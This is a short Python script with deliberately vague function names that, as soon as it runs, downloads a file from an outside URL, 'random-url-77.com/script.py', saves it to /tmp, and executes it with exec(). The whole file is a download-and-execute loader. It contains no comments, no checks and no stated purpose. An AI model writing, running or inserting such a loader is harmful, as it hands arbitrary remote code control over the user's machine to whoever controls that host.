import requests
import os

def g1(u):
    r = requests.get(u)
    return r.text

def g2(fp, c):
    with open(fp, "w") as f:
        f.write(c)

def g3(fp):
    with open(fp, "r") as f:
        return f.read()

def g4(s):
    exec(s)

def g5(u, fp):
    cd = g1(u)
    g2(fp, cd)
    sc = g3(fp)
    g4(sc)

def main():
    rnd_url = "http://random-url-77.com/script.py"
    lcl_fl = "/tmp/script77.py"
    g5(rnd_url, lcl_fl)

main()
